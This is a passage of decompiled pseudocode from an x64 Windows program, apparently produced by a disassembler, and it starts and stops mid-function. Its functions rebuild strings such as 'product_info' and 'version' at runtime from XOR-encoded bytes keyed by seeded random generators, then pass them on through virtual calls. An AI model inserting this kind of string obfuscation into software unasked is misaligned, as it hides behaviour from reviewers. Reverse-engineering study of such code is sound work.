    dword_1400D9918 ^= ((unsigned int)dword_1400D9918 >> 13) ^ 32 * (dword_1400D9918 ^ (dword_1400D9918 << 12));
    byte_1400D998E = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400D9990 = v0 | 2;
    byte_1400D9994[0] = v2 ^ 0x63;
    byte_1400D9995 = (v2 - 1) ^ 0x6F;
    byte_1400D9996 = (v2 - 2) ^ 0x72;
    byte_1400D9997 = (v2 - 3) ^ 0x65;
  }
  result = byte_1400D9998;
  if ( !byte_1400D9998[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400D9994[v5++];
      v7 = v2 - v4++;
      byte_1400D9998[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 4 );
  }
  return result;
}
// 1400D990C: using guessed type int dword_1400D990C;
// 1400D9918: using guessed type int dword_1400D9918;
// 1400D991C: using guessed type int dword_1400D991C;
// 1400D9920: using guessed type int dword_1400D9920;
// 1400D998E: using guessed type char byte_1400D998E;
// 1400D9990: using guessed type int dword_1400D9990;
// 1400D9995: using guessed type char byte_1400D9995;
// 1400D9996: using guessed type char byte_1400D9996;
// 1400D9997: using guessed type char byte_1400D9997;

//----- (0000000140006B50) ----------------------------------------------------
_WORD *__fastcall sub_140006B50(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _WORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _WORD *v6; // rax
  bool v7; // cf
  _WORD *v8; // rax
  __int64 v9; // rdx
  _WORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9988;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9988 & 1 )
  {
    v5 = byte_1400D9985;
  }
  else
  {
    v4 = 69069 * dword_1400D991C + 1234567;
    v1 = dword_1400D9988 | 1;
    dword_1400D991C = v4;
    dword_1400D9988 |= 1u;
    dword_1400D990C = HIWORD(dword_1400D990C) + 36969 * (unsigned __int16)dword_1400D990C;
    LOBYTE(v4) = (BYTE2(dword_1400D9920) + 80 * dword_1400D9920) ^ v4;
    dword_1400D9920 = HIWORD(dword_1400D9920) + 18000 * (unsigned __int16)dword_1400D9920;
    v5 = (((unsigned int)dword_1400D9918 >> 13) ^ 32 * dword_1400D9918 ^ dword_1400D9918) + v4;
    dword_1400D9918 ^= ((unsigned int)dword_1400D9918 >> 13) ^ 32 * (dword_1400D9918 ^ (dword_1400D9918 << 12));
    byte_1400D9985 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9988 = v1 | 2;
    byte_1400D998C[0] = v5 ^ 0x70;
    byte_1400D998D = (v5 - 1) ^ 0x69;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 2ui64 )
  {
    sub_140004790(Src, 2ui64, 0i64);
    v5 = byte_1400D9985;
  }
  if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
    v6 = v3;
  else
    v6 = *(_WORD **)v3;
  *v6 = 0;
  v7 = *((_QWORD *)v3 + 3) < 0x10ui64;
  *((_QWORD *)v3 + 2) = 2i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = *(_WORD **)v3;
  *((_BYTE *)v8 + 2) = 0;
  v9 = 0i64;
  do
  {
    if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
      v10 = v3;
    else
      v10 = *(_WORD **)v3;
    v11 = byte_1400D998C[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 2 );
  return v3;
}
// 1400D990C: using guessed type int dword_1400D990C;
// 1400D9918: using guessed type int dword_1400D9918;
// 1400D991C: using guessed type int dword_1400D991C;
// 1400D9920: using guessed type int dword_1400D9920;
// 1400D9985: using guessed type char byte_1400D9985;
// 1400D9988: using guessed type int dword_1400D9988;
// 1400D998D: using guessed type char byte_1400D998D;

//----- (0000000140006CE0) ----------------------------------------------------
_QWORD *__fastcall sub_140006CE0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9944;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9944 & 1 )
  {
    v5 = byte_1400D9941;
  }
  else
  {
    v4 = 69069 * dword_1400D991C + 1234567;
    v1 = dword_1400D9944 | 1;
    dword_1400D991C = v4;
    dword_1400D9944 |= 1u;
    dword_1400D990C = HIWORD(dword_1400D990C) + 36969 * (unsigned __int16)dword_1400D990C;
    LOBYTE(v4) = (BYTE2(dword_1400D9920) + 80 * dword_1400D9920) ^ v4;
    dword_1400D9920 = HIWORD(dword_1400D9920) + 18000 * (unsigned __int16)dword_1400D9920;
    v5 = (((unsigned int)dword_1400D9918 >> 13) ^ 32 * dword_1400D9918 ^ dword_1400D9918) + v4;
    dword_1400D9918 ^= ((unsigned int)dword_1400D9918 >> 13) ^ 32 * (dword_1400D9918 ^ (dword_1400D9918 << 12));
    byte_1400D9941 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9944 = v1 | 2;
    byte_1400D9948[0] = v5 ^ 0x70;
    byte_1400D9949 = (v5 - 1) ^ 0x72;
    byte_1400D994A = (v5 - 2) ^ 0x6F;
    byte_1400D994B = (v5 - 3) ^ 0x64;
    byte_1400D994C = (v5 - 4) ^ 0x75;
    byte_1400D994D = (v5 - 5) ^ 0x63;
    byte_1400D994E = (v5 - 6) ^ 0x74;
    byte_1400D994F = (v5 - 7) ^ 0x5F;
    byte_1400D9950 = (v5 - 8) ^ 0x69;
    byte_1400D9951 = (v5 - 9) ^ 0x6E;
    byte_1400D9952 = (v5 - 10) ^ 0x66;
    byte_1400D9953 = (v5 - 11) ^ 0x6F;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xCui64 )
  {
    sub_140004790(Src, 0xCui64, 0i64);
    v5 = byte_1400D9941;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 12i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 12) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9948[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xC );
  return v3;
}
// 1400D990C: using guessed type int dword_1400D990C;
// 1400D9918: using guessed type int dword_1400D9918;
// 1400D991C: using guessed type int dword_1400D991C;
// 1400D9920: using guessed type int dword_1400D9920;
// 1400D9941: using guessed type char byte_1400D9941;
// 1400D9944: using guessed type int dword_1400D9944;
// 1400D9949: using guessed type char byte_1400D9949;
// 1400D994A: using guessed type char byte_1400D994A;
// 1400D994B: using guessed type char byte_1400D994B;
// 1400D994C: using guessed type char byte_1400D994C;
// 1400D994D: using guessed type char byte_1400D994D;
// 1400D994E: using guessed type char byte_1400D994E;
// 1400D994F: using guessed type char byte_1400D994F;
// 1400D9950: using guessed type char byte_1400D9950;
// 1400D9951: using guessed type char byte_1400D9951;
// 1400D9952: using guessed type char byte_1400D9952;
// 1400D9953: using guessed type char byte_1400D9953;

//----- (0000000140006EF0) ----------------------------------------------------
_QWORD *__fastcall sub_140006EF0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9958;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9958 & 1 )
  {
    v5 = byte_1400D9954;
  }
  else
  {
    v4 = 69069 * dword_1400D991C + 1234567;
    v1 = dword_1400D9958 | 1;
    dword_1400D991C = v4;
    dword_1400D9958 |= 1u;
    dword_1400D990C = HIWORD(dword_1400D990C) + 36969 * (unsigned __int16)dword_1400D990C;
    LOBYTE(v4) = (BYTE2(dword_1400D9920) + 80 * dword_1400D9920) ^ v4;
    dword_1400D9920 = HIWORD(dword_1400D9920) + 18000 * (unsigned __int16)dword_1400D9920;
    v5 = (((unsigned int)dword_1400D9918 >> 13) ^ 32 * dword_1400D9918 ^ dword_1400D9918) + v4;
    dword_1400D9918 ^= ((unsigned int)dword_1400D9918 >> 13) ^ 32 * (dword_1400D9918 ^ (dword_1400D9918 << 12));
    byte_1400D9954 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9958 = v1 | 2;
    byte_1400D995C[0] = v5 ^ 0x76;
    byte_1400D995D = (v5 - 1) ^ 0x65;
    byte_1400D995E = (v5 - 2) ^ 0x72;
    byte_1400D995F = (v5 - 3) ^ 0x73;
    byte_1400D9960 = (v5 - 4) ^ 0x69;
    byte_1400D9961 = (v5 - 5) ^ 0x6F;
    byte_1400D9962 = (v5 - 6) ^ 0x6E;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 7ui64 )
  {
    sub_140004790(Src, 7ui64, 0i64);
    v5 = byte_1400D9954;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 7i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 7) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D995C[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 7 );
  return v3;
}
// 1400D990C: using guessed type int dword_1400D990C;
// 1400D9918: using guessed type int dword_1400D9918;
// 1400D991C: using guessed type int dword_1400D991C;
// 1400D9920: using guessed type int dword_1400D9920;
// 1400D9954: using guessed type char byte_1400D9954;
// 1400D9958: using guessed type int dword_1400D9958;
// 1400D995D: using guessed type char byte_1400D995D;
// 1400D995E: using guessed type char byte_1400D995E;
// 1400D995F: using guessed type char byte_1400D995F;
// 1400D9960: using guessed type char byte_1400D9960;
// 1400D9961: using guessed type char byte_1400D9961;
// 1400D9962: using guessed type char byte_1400D9962;

//----- (00000001400070C0) ----------------------------------------------------
void __fastcall sub_1400070C0(void **a1, __int64 *a2)
{
  __int64 *v2; // rsi
  void **v3; // rdi
  size_t v4; // rbx
  void *v5; // rax
  const char *v6; // rax
  void **v7; // rax
  __int64 v8; // rax
  _QWORD *v9; // rax
  size_t v10; // r8
  __int64 v11; // rcx
  void *v12; // [rsp+28h] [rbp-C0h]
  __int64 v13; // [rsp+38h] [rbp-B0h]
  unsigned __int64 v14; // [rsp+40h] [rbp-A8h]
  void *v15; // [rsp+48h] [rbp-A0h]
  __int64 v16; // [rsp+58h] [rbp-90h]
  unsigned __int64 v17; // [rsp+60h] [rbp-88h]
  void *v18; // [rsp+68h] [rbp-80h]
  __int64 v19; // [rsp+78h] [rbp-70h]
  void *Dst; // [rsp+80h] [rbp-68h]
  __int64 v21; // [rsp+90h] [rbp-58h]
  unsigned __int64 v22; // [rsp+98h] [rbp-50h]
  void *v23; // [rsp+A0h] [rbp-48h]
  __int64 v24; // [rsp+B0h] [rbp-38h]
  unsigned __int64 v25; // [rsp+B8h] [rbp-30h]
  void *Src; // [rsp+C8h] [rbp-20h]
  unsigned __int64 v27; // [rsp+E0h] [rbp-8h]
  void *v28; // [rsp+E8h] [rbp+0h]
  __int64 v29; // [rsp+F8h] [rbp+10h]
  unsigned __int64 v30; // [rsp+100h] [rbp+18h]

  v2 = a2;
  v3 = a1;
  (*(void (__cdecl **)(__int64))(*(_QWORD *)*a2 + 40i64))(*a2);
  v22 = 15i64;
  v21 = 0i64;
  LOBYTE(Dst) = 0;
  v25 = 15i64;
  v24 = 0i64;
  LOBYTE(v23) = 0;
  LODWORD(v19) = 1;
  v4 = -1i64;
  if ( &Dst != v3 )
    sub_140004DF0(&Dst, v3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v5 = sub_140081A60(&Src);
  v6 = (const char *)sub_1400054F0(v5, &v28);
  v7 = (void **)sub_140081940((__int64)&v15, v6);
  v8 = sub_1400076A0(v7, (__int64)&v18);
  v14 = 15i64;
  v13 = 0i64;
  LOBYTE(v12) = 0;
  sub_140007990(&v12, v8);
  sub_140004DF0(&v23, &v12, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v14 >= 0x10 )
    operator delete(v12);
  v14 = 15i64;
  v13 = 0i64;
  LOBYTE(v12) = 0;
  if ( (unsigned __int64)v18 >= 0x10 )
    operator delete(v18);
  v18 = (void *)15;
  v19 = 0i64;
  LOBYTE(v18) = 0;
  if ( v17 >= 0x10 )
    operator delete(v15);
  v17 = 15i64;
  v16 = 0i64;
  LOBYTE(v15) = 0;
  if ( v30 >= 0x10 )
    operator delete(v28);
  v30 = 15i64;
  v29 = 0i64;
  LOBYTE(v28) = 0;
  if ( v27 >= 8 )
    operator delete(Src);
  v9 = (_QWORD *)sub_1400073F0((__int64)&v19, (__int64)&Src);
  if ( v9[3] >= 0x10ui64 )
    v9 = (_QWORD *)*v9;
  v17 = 15i64;
  v16 = 0i64;
  LOBYTE(v15) = 0;
  if ( *(_BYTE *)v9 )
  {
    v10 = -1i64;
    do
      ++v10;
    while ( *((_BYTE *)v9 + v10) );
  }
  else
  {
    v10 = 0i64;
  }
  sub_140004F20(&v15, v9, v10);
  v14 = 15i64;
  v13 = 0i64;
  LOBYTE(v12) = 0;
  if ( *(_BYTE *)qword_1400D9910 )
  {
    do
      ++v4;
    while ( *((_BYTE *)qword_1400D9910 + v4) );
  }
  else
  {
    v4 = 0i64;
  }
  sub_140004F20(&v12, qword_1400D9910, v4);
  v11 = *v2;
  v18 = (void *)15;
  v19 = 0i64;
  LOBYTE(v18) = 0;
  (*(void (__fastcall **)(__int64, void **, void **, void **))(*(_QWORD *)v11 + 8i64))(v11, &v12, &v18, &v15);
  if ( (unsigned __int64)v18 >= 0x10 )
    operator delete(v18);
  v18 = (void *)15;
  v19 = 0i64;
  LOBYTE(v18) = 0;
  if ( v14 >= 0x10 )
    operator delete(v12);
  v14 = 15i64;
  v13 = 0i64;
  LOBYTE(v12) = 0;
  if ( v17 >= 0x10 )
    operator delete(v15);
  v17 = 15i64;
  v16 = 0i64;
  LOBYTE(v15) = 0;
  if ( v27 >= 0x10 )
    operator delete(Src);
  if ( v25 >= 0x10 )
    operator delete(v23);
  v25 = 15i64;
  v24 = 0i64;
  LOBYTE(v23) = 0;
  if ( v22 >= 0x10 )
    operator delete(Dst);
}
// 140007990: using guessed type __int64 __fastcall sub_140007990(_QWORD, _QWORD);

//----- (00000001400073F0) ----------------------------------------------------
__int64 __fastcall sub_1400073F0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rsi
  _BYTE *v4; // rbx
  _QWORD *v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  _WORD *v8; // rbx
  _QWORD *v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  void **v12; // rax
  _WORD *v13; // rbx
  _QWORD *v14; // rax
  __int64 v15; // rax
  __int64 v16; // rax
  __int64 v17; // rcx
  char v19; // [rsp+10h] [rbp-71h]
  char v20; // [rsp+28h] [rbp-59h]
  __int64 v21; // [rsp+40h] [rbp-41h]
  __int64 v22; // [rsp+48h] [rbp-39h]
  void *Src; // [rsp+50h] [rbp-31h]
  __int64 v24; // [rsp+60h] [rbp-21h]
  unsigned __int64 v25; // [rsp+68h] [rbp-19h]
  void *v26; // [rsp+70h] [rbp-11h]
  __int64 v27; // [rsp+80h] [rbp-1h]
  unsigned __int64 v28; // [rsp+88h] [rbp+7h]
  void *v29; // [rsp+90h] [rbp+Fh]
  void *v30; // [rsp+98h] [rbp+17h]
  unsigned __int64 v31; // [rsp+A8h] [rbp+27h]
  unsigned __int64 v32; // [rsp+B0h] [rbp+2Fh]

  v21 = -2i64;
  v2 = a2;
  v3 = a1;
  v22 = a2;
  sub_14006BD10((__int64)&v21, 0);
  sub_14006BCD0((__int64)&v19, *(_DWORD *)v3);
  v4 = sub_140006440(&v26);
  v5 = sub_1400065A0(&Src);
  v6 = sub_14006C0C0((__int64)&v20, v5);
  v7 = sub_14006C0C0(v6, v4);
  sub_14006BFB0(v7);
  if ( v25 >= 0x10 )
    operator delete(Src);
  v25 = 15i64;
  v24 = 0i64;
  LOBYTE(Src) = 0;
  if ( v28 >= 0x10 )
    operator delete(v26);
  v28 = 15i64;
  v27 = 0i64;
  LOBYTE(v26) = 0;
  sub_14006BF10((__int64)&v19);
  sub_14006BC80((__int64)&v19, (void **)(v3 + 8));
  v8 = sub_1400062B0(&Src);
  v9 = sub_1400065A0(&v26);
  v10 = sub_14006C0C0((__int64)&v20, v9);
  v11 = sub_14006C0C0(v10, v8);
  sub_14006BFB0(v11);
  if ( v28 >= 0x10 )
    operator delete(v26);
  v28 = 15i64;
  v27 = 0i64;
  LOBYTE(v26) = 0;
  if ( v25 >= 0x10 )
    operator delete(Src);
  v25 = 15i64;
  v24 = 0i64;
  LOBYTE(Src) = 0;
  sub_14006BF10((__int64)&v19);
  v12 = (void **)sub_1400076A0((void **)(v3 + 40), (__int64)&v29);
  sub_14006BC80((__int64)&v19, v12);
  v13 = sub_140006B50(&Src);
  v14 = sub_1400065A0(&v26);
  v15 = sub_14006C0C0((__int64)&v20, v14);
  v16 = sub_14006C0C0(v15, v13);
  sub_14006BFB0(v16);
  if ( v28 >= 0x10 )
    operator delete(v26);
  v28 = 15i64;
  v27 = 0i64;
  LOBYTE(v26) = 0;
  if ( v25 >= 0x10 )
    operator delete(Src);
  v25 = 15i64;
  v24 = 0i64;
  LOBYTE(Src) = 0;
  sub_14006BF10((__int64)&v19);
  if ( v31 >= 0x10 )
    operator delete(v29);
  v17 = sub_140072820((__int64)&v29);
  (*(void (__fastcall **)(__int64, __int64, char *))(*(_QWORD *)v17 + 8i64))(v17, v2, &v20);
  v29 = &off_1400A2B70;
  if ( v32 >= 0x10 )
    operator delete(v30);
  v32 = 15i64;
  v31 = 0i64;
  LOBYTE(v30) = 0;
  sub_14007E240(&v29);
  sub_14006BF10((__int64)&v20);
  return v2;
}
// 1400A2B70: using guessed type __int64 (__fastcall *off_1400A2B70)(void *);

//----- (00000001400076A0) ----------------------------------------------------
__int64 __fastcall sub_1400076A0(void **a1, __int64 a2)
{
  __int64 v2; // rdi
  void **v3; // rbx
  _QWORD *v4; // rbx
  _QWORD *v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rcx
  char v10; // [rsp+28h] [rbp-51h]
  char v11; // [rsp+40h] [rbp-39h]
  __int64 v12; // [rsp+58h] [rbp-21h]
  __int64 v13; // [rsp+60h] [rbp-19h]
  void *v14; // [rsp+68h] [rbp-11h]
  void *v15; // [rsp+70h] [rbp-9h]
  __int64 v16; // [rsp+78h] [rbp-1h]
  unsigned __int64 v17; // [rsp+80h] [rbp+7h]
  unsigned __int64 v18; // [rsp+88h] [rbp+Fh]
  void *Src; // [rsp+98h] [rbp+1Fh]
  __int64 v20; // [rsp+A8h] [rbp+2Fh]
  unsigned __int64 v21; // [rsp+B0h] [rbp+37h]

  v13 = -2i64;
  v2 = a2;
  v3 = a1;
  v12 = a2;
  sub_14006BD10((__int64)&v10, 0);
  sub_14006BC80((__int64)&v11, v3);
  v4 = sub_140006EF0(&v14);
  v5 = sub_140006CE0(&Src);
  v6 = sub_14006C0C0((__int64)&v10, v5);
  v7 = sub_14006C0C0(v6, v4);
  sub_14006BFB0(v7);
  if ( v21 >= 0x10 )
    operator delete(Src);
  v21 = 15i64;
  v20 = 0i64;
  LOBYTE(Src) = 0;
  if ( v17 >= 0x10 )
    operator delete(v14);
  v17 = 15i64;
  v16 = 0i64;
  LOBYTE(v14) = 0;
  sub_14006BF10((__int64)&v11);
  v8 = sub_140072820((__int64)&v14);
  (*(void (__fastcall **)(__int64, __int64, char *))(*(_QWORD *)v8 + 8i64))(v8, v2, &v10);
  v14 = &off_1400A2B70;
  if ( v18 >= 0x10 )
    operator delete(v15);
  v18 = 15i64;
  v17 = 0i64;
  LOBYTE(v15) = 0;
  sub_14007E240(&v14);
  sub_14006BF10((__int64)&v10);
  return v2;
}
// 1400A2B70: using guessed type __int64 (__fastcall *off_1400A2B70)(void *);

//----- (0000000140007800) ----------------------------------------------------
char __fastcall sub_140007800(__int64 a1)
{
  __int64 v1; // rbx
  unsigned __int8 (***v2)(void); // rcx
  __int64 v3; // rcx
  struct _Thrd_imp_t *v4; // rax
  char v6; // [rsp+20h] [rbp-18h]
  int v7; // [rsp+28h] [rbp-10h]
  void (__fastcall *v8)(void **, __int64 *); // [rsp+40h] [rbp+8h]

  v1 = a1;
  if ( !*(_QWORD *)(a1 + 96) )
    return 0;
  v2 = *(unsigned __int8 (****)(void))(a1 + 80);
  if ( v2 )
  {
    if ( !(**v2)() )
      return 0;
  }
  v3 = *(_QWORD *)(v1 + 64);
  if ( !v3 || !(*(unsigned __int8 (**)(void))(*(_QWORD *)v3 + 8i64))() )
    return 0;
  v8 = sub_1400070C0;
  v4 = sub_140005700((struct _Thrd_imp_t *)&v6, (__int64 *)&v8, (_QWORD *)(v1 + 16), (_QWORD *)(v1 + 96));
  if ( *(_DWORD *)(v1 + 136) )
    terminate();
  *(_OWORD *)(v1 + 128) = *(_OWORD *)v4;
  *((_DWORD *)v4 + 2) = 0;
  if ( v7 )
    terminate();
  if ( (unsigned int)Concurrency::details::_CurrentScheduler::_Id() == -1 )
    Thrd_yield();
  else
    Concurrency::details::_Context::_Yield();
  return 1;
}
// 1400A1748: using guessed type __int64 Thrd_yield(void);
// 1400A1A48: using guessed type __int64 Concurrency::details::_CurrentScheduler::_Id(void);
// 1400A1A50: using guessed type __int64 Concurrency::details::_Context::_Yield(void);
// 1400A1A58: using guessed type void terminate(void);

//----- (00000001400078E0) ----------------------------------------------------
void __fastcall sub_1400078E0(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rcx
  __int128 v3; // [rsp+20h] [rbp-28h]
  __int128 v4; // [rsp+30h] [rbp-18h]

  v1 = a1;
  if ( *(_BYTE *)(a1 + 8) )
    sub_14000DDF0(*(LPCSTR *)(a1 + 112));
  if ( *(_DWORD *)(v1 + 136) )
  {
    v3 = *(_OWORD *)Thrd_current(&v4);
    v4 = *(_OWORD *)(v1 + 128);
    if ( (unsigned int)Thrd_equal(&v4, &v3) )
      std::_Throw_Cpp_error(5);
    v4 = *(_OWORD *)(v1 + 128);
    if ( (unsigned int)Thrd_join(&v4, 0i64) )
      std::_Throw_Cpp_error(2);
    *(_DWORD *)(v1 + 136) = 0;
  }
  v2 = *(_QWORD *)(v1 + 64);
  if ( v2 )
    (*(void (**)(void))(*(_QWORD *)v2 + 16i64))();
}
// 1400A1730: using guessed type void __stdcall std::_Throw_Cpp_error(_DWORD);
// 1400A1738: using guessed type __int64 __fastcall Thrd_current(_QWORD);
// 1400A1740: using guessed type __int64 __fastcall Thrd_equal(_QWORD, _QWORD);
// 1400A1750: using guessed type __int64 __fastcall Thrd_join(_QWORD, _QWORD);

//----- (0000000140007BA0) ----------------------------------------------------
int __fastcall sub_140007BA0(__int64 a1)
{
  __int64 v1; // rbx
  int result; // eax
  __int64 v3; // rcx
  __int64 v4; // rcx
  __int64 v5; // rcx
  __int64 v6; // rcx

  v1 = a1;
  *(_BYTE *)(a1 + 8) = 1;
  sub_14000DE40(*(LPCSTR *)(a1 + 112), 0xFFFFFFFF);
  result = sub_14000DDC0(*(_QWORD *)(v1 + 112));
  v3 = *(_QWORD *)(v1 + 96);
  *(_BYTE *)(v1 + 8) = 0;
  if ( v3 )
    result = (*(__int64 (**)(void))(*(_QWORD *)v3 + 48i64))();
  v4 = *(_QWORD *)(v1 + 80);
  if ( v4 )
    result = (*(__int64 (**)(void))(*(_QWORD *)v4 + 8i64))();
  v5 = *(_QWORD *)(v1 + 64);
  if ( v5 )
    result = (*(__int64 (**)(void))(*(_QWORD *)v5 + 16i64))();
  v6 = *(_QWORD *)(v1 + 48);
  if ( v6 )
    result = (*(__int64 (**)(void))(*(_QWORD *)v6 + 8i64))();
  return result;
}

//----- (0000000140007C20) ----------------------------------------------------
__int64 __fastcall sub_140007C20(std::_Pad *a1)
{
  std::_Pad *v1; // rbx
  void (__fastcall *v2)(void **, char *); // ST28_8
  volatile signed __int32 *v3; // rbx
  char v5; // [rsp+30h] [rbp-48h]
  volatile signed __int32 *v6; // [rsp+38h] [rbp-40h]
  void *v7; // [rsp+40h] [rbp-38h]
  __int64 v8; // [rsp+50h] [rbp-28h]
  unsigned __int64 v9; // [rsp+58h] [rbp-20h]

  v1 = a1;
  v2 = (void (__fastcall *)(void **, char *))*((_QWORD *)a1 + 4);
  sub_140005840((__int64)&v5, (_QWORD *)a1 + 5);
  std::_Pad::_Release(v1);
  v2(&v7, &v5);
  if ( v9 >= 0x10 )
    operator delete(v7);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(v7) = 0;
  v3 = v6;
  if ( v6 )
  {
    if ( !_InterlockedDecrement(v6 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v3 + 8i64))(v3);
      if ( !_InterlockedDecrement(v3 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v3 + 16i64))(v3);
    }
  }
  return 0i64;
}
// 1400A1710: using guessed type void std::_Pad::_Release(std::_Pad *__hidden this);

//----- (0000000140007CF0) ----------------------------------------------------
void __fastcall sub_140007CF0(_QWORD *a1)
{
  __int64 v1; // rax
  _QWORD *v2; // rbx
  __int64 v3; // rdi
  void *v4; // rcx
  void *v5; // rcx

  v1 = a1[4];
  v2 = a1;
  if ( v1 )
  {
    do
    {
      if ( !--v1 )
        a1[3] = 0i64;
    }
    while ( v1 );
    a1[4] = 0i64;
  }
  v3 = a1[2];
  while ( v3 )
  {
    v4 = *(void **)(v2[1] + 8 * --v3);
    if ( v4 )
      operator delete(v4);
  }
  v5 = (void *)v2[1];
  if ( v5 )
    operator delete(v5);
  v2[1] = 0i64;
  v2[2] = 0i64;
}

//----- (0000000140007D70) ----------------------------------------------------
void __fastcall sub_140007D70(_QWORD *a1)
{
  _QWORD *v1; // rbx
  __int64 v2; // rdi
  bool v3; // zf
  __int64 v4; // rdi
  void *v5; // rcx
  void *v6; // rcx

  v1 = a1;
  while ( v1[4] )
  {
    v2 = *(_QWORD *)(v1[1] + 8 * ((v1[2] - 1i64) & (v1[4] + v1[3] - 1i64)));
    if ( *(_QWORD *)(v2 + 48) >= 0x10ui64 )
      operator delete(*(void **)(v2 + 24));
    *(_QWORD *)(v2 + 48) = 15i64;
    *(_QWORD *)(v2 + 40) = 0i64;
    *(_BYTE *)(v2 + 24) = 0;
    v3 = v1[4]-- == 1i64;
    if ( v3 )
      v1[3] = 0i64;
  }
  v4 = v1[2];
  while ( v4 )
  {
    v5 = *(void **)(v1[1] + 8 * --v4);
    if ( v5 )
      operator delete(v5);
  }
  v6 = (void *)v1[1];
  if ( v6 )
    operator delete(v6);
  v1[1] = 0i64;
  v1[2] = 0i64;
}

//----- (0000000140007E30) ----------------------------------------------------
__int64 __fastcall sub_140007E30(__int64 (__fastcall ***a1)(_QWORD, signed __int64))
{
  __int64 result; // rax

  if ( a1 )
    result = (**a1)(a1, 1i64);
  return result;
}

//----- (0000000140007E50) ----------------------------------------------------
void __fastcall sub_140007E50(__int64 a1)
{
  void *v1; // rbx

  v1 = *(void **)(a1 + 16);
  if ( v1 )
  {
    sub_14000DD60(*(_QWORD *)(a1 + 16));
    operator delete(v1);
  }
}

//----- (0000000140007E80) ----------------------------------------------------
size_t *__fastcall sub_140007E80(size_t *a1, size_t a2, size_t a3, size_t *a4, size_t a5, size_t a6)
{
  size_t *v6; // rbx
  size_t v7; // rcx
  size_t *v8; // r15
  size_t v9; // rbp
  size_t v10; // rsi
  size_t v11; // rax
  size_t v12; // rdi
  size_t v13; // r14
  size_t v14; // rax
  size_t v15; // rdx
  size_t v16; // r13
  size_t v17; // r14
  unsigned __int64 v18; // rax
  size_t v19; // rcx
  size_t v20; // rax
  size_t v21; // rax
  unsigned __int64 v22; // rax
  size_t v23; // rcx
  size_t v24; // rax
  unsigned __int64 v25; // rax
  size_t v26; // rcx
  size_t v27; // rax
  size_t v28; // r8
  const void *v29; // rdx
  void *v30; // rcx
  unsigned __int64 v31; // rax
  size_t v32; // rcx
  size_t v33; // rax
  unsigned __int64 v34; // rax
  size_t v35; // rcx
  size_t v36; // rax
  unsigned __int64 v37; // rax
  size_t v38; // rcx
  size_t v39; // rax
  unsigned __int64 v40; // rax
  size_t v41; // rdx
  size_t v42; // rax
  size_t v43; // rcx
  size_t v44; // rax
  unsigned __int64 v45; // rax
  size_t v46; // rcx
  size_t v47; // rax
  unsigned __int64 v48; // rax
  size_t v49; // rcx
  size_t v50; // rax
  bool v51; // cf
  size_t v52; // rax

  v6 = a1;
